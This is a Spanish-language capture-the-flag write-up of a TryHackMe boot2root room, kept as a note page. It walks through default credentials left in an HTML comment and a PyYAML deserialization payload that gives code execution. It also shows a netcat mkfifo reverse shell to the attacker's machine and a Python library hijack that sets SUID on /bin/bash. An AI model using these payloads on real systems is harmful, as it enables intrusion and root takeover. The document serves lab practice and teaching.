---
# yaml-language-server: $schema=schemas\page.schema.json
Object type:
    - Page
Backlinks:
    - writeupsctf
Creation date: "2026-07-31T18:31:50Z"
Created by:
    - Sharp Scarlet
id: bafyreietidm6rhwe23kvgqdppjvsvebc36wgv34hw4b4okcbpgabbhso6a
---
# THM_Hollidays-5-Beach_Bar
Internet
│
▼
+—————————-+
| Gunicorn / Flask  |
|   Puerto 80       |
+—————————-+
│
▼
Comentario HTML
│
▼
Credenciales Demo
│
▼
Dashboard
│
▼
Upload YAML
│
▼
yaml.load()
│
▼
RCE
│
▼
Reverse Shell
│
▼
Enumeración
│
▼
Python Library Hijacking
│
▼
Root
# TryHackMe - Hacker Holidays
(Boot2Root)
## Sin Writeups
---
# Reconocimiento
## Nmap
```
nmap -sC -sV <IP>


```
Resultado:
```
TTL: 62
80/tcp open http Gunicorn


http-title: Beach Bar // Sign in
Requested resource: /login
OS: Linux


```
La aplicación redirige directamente a:
```
http://<IP>/login


```
---
# Enumeración Web
Al inspeccionar el HTML del login aparece un comentario muy interesante:
```
<!--
staff note:
the demo DJ login is still enabled for the soft opening.

dj / dj

swap this before the season starts
(ticket BAR-7)
-->


```
## Credenciales encontradas
```
Usuario: dj
Contraseña: dj


```
---
# Panel autenticado
Tras iniciar sesión se accede a:
```
/dashboard


```
Funcionalidades:
- Subir playlists
- Descargar playlists
- Formato aceptado: YAML

Cookie de sesión:
```
session=eyJ1c2VyIjoiZGoifQ.amzLZg.XL_vHeuexyBCHsSm5OZ61ygX_60


```
Probé:
- caracteres especiales
- SQLi básica
- manipulación de peticiones con Burp

Resultado:
```
Nada interesante.


```
---
# Hipótesis
Si la aplicación acepta YAML...
¿Estará usando `yaml.load()` de PyYAML?
Buscando información aparece la clásica vulnerabilidad de deserialización.
Payload de prueba:
```
!!python/object/apply:subprocess.check_output
args:
  - "pwd"
kwds:
  shell: true


```
Respuesta:
```
b'/opt/beach-bar/webapp\n'


```
## Confirmado
✅ Remote Code Execution mediante deserialización insegura de YAML.
---
# Comprobación del entorno
Antes de lanzar una reverse shell compruebo qué herramientas existen.
Checklist:
```
which nc
which python
which python3
which perl
which curl
which wget


```
Todo disponible.
---
# Reverse Shell
En Kali:
```
nc -lvnp 4444


```
Payload YAML:
```
!!python/object/apply:subprocess.check_output
args:
  - "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_KALI> 4444 >/tmp/f"
kwds:
  shell: true


```
Conexión obtenida:
```
$ whoami

bartender


```
---
# Tratamiento del TTY
```
python3 -c 'import pty; pty.spawn("/bin/bash")'


```
Después:
```
CTRL+Z
stty raw -echo
fg
export TERM=xterm-256color


```
TTY totalmente funcional.
---
# Enumeración Local
Usuarios:
```
cat /etc/passwd


```
```
bartender
root


```
Antes de continuar intento localizar flags:
```
find / -name "*flag*" 2>/dev/null


```
Sin resultados.
(En este punto expiró la VPN de THM y tuve que reconectar.)
---
# User Flag
Nueva conexión.
```
cd /home/bartender


cat user.txt


REDACTED


```
🎉 Primera flag conseguida.
---
# Enumeración para Privilege Escalation
SUID:
```
find / -perm -4000 -type f 2>/dev/null


```
Encontrados los habituales:
```
sudo
passwd
mount
su
...


```
Nada especialmente explotable en GTFOBins.
También probé:
```
passwd


```
Con la idea de cambiar la contraseña del usuario.
Resultado:
```
Authentication token manipulation error


```
No funcionó.
Probé también un ataque por fuerza bruta al SSH contra:
- bartender
- root

Sin éxito.
---
# Revisión del código fuente
Encontré permisos de lectura sobre la aplicación.
```
/opt/beach-bar/webapp/app.py


```
Leyendo el código aparece el origen de la RCE:
```
parsed = yaml.load(content, Loader=yaml.Loader)


```
Exactamente la vulnerabilidad que había explotado.
---
# Más Enumeración
Revisando servicios:
```
/etc/systemd/system/beachbar.service


```
y especialmente:
```
/opt/beach-bar/jukeboxd/jukeboxd.py


```
Aparece un servicio Python ejecutándose como root.
Consultando:
```
systemctl show jukeboxd.service --property=ExecStart


```
Obtengo:
```
ExecStart=/opt/beach-bar/venv/bin/python \
/opt/beach-bar/jukeboxd/jukeboxd.py \
--stream-pass SunsetSpritz2024! \
--bitrate 320k


```
También queda expuesta la contraseña del servicio:
```
SunsetSpritz2024!


```
---
# Escalada de privilegios
La clave estaba en que el servicio Python cargaba módulos desde un directorio donde el usuario tenía permisos de escritura.
Técnica utilizada:
**Python Library Hijacking**
Se crea un módulo falso:
```
argparse.py


```
Con código malicioso:
```
import os

os.system("chmod +s /bin/bash")


```
Al reiniciarse o ejecutarse el servicio como root, Python importa nuestro módulo antes que el original.
Resultado:
```
chmod +s /bin/bash


```
Finalmente:
```
bash -p


```
```
root


```
🏁 Root conseguido.
El flag se encontraba en un archivo root.txt en /root
---
# Vulnerabilidades identificadas
- Credenciales por defecto ( `dj:dj`)
- Deserialización insegura con `yaml.load()`
- Ejecución remota de comandos
- Mala separación de privilegios
- Python Library Hijacking
- Servicio ejecutándose como root con importaciones inseguras
- Exposición de credenciales ( `SunsetSpritz2024!`)
---

# Lo aprendido
- Buscar siempre comentarios HTML.
- Cuando una aplicación acepta YAML, comprobar inmediatamente si usa `yaml.load()`.
- Antes de lanzar una reverse shell, enumerar herramientas disponibles.
- Tratar el TTY cuanto antes mejora muchísimo la comodidad.
- Leer el código fuente suele ahorrar muchísimo tiempo.
- Los servicios de `systemd` y las aplicaciones Python son una mina para encontrar escaladas de privilegios.
- Incluso cuando una vía parece agotada (SUID, SSH, passwd…), seguir enumerando suele acabar revelando el vector correcto.
---

## Valoración personal
Una sala muy divertida. La RCE mediante YAML fue relativamente rápida de descubrir, pero la escalada obligaba a leer el código, entender cómo funcionaba el servicio de Python y pensar en técnicas como **Python Library Hijacking**. Muy buena para practicar metodología Boot2Root sin depender de writeups.

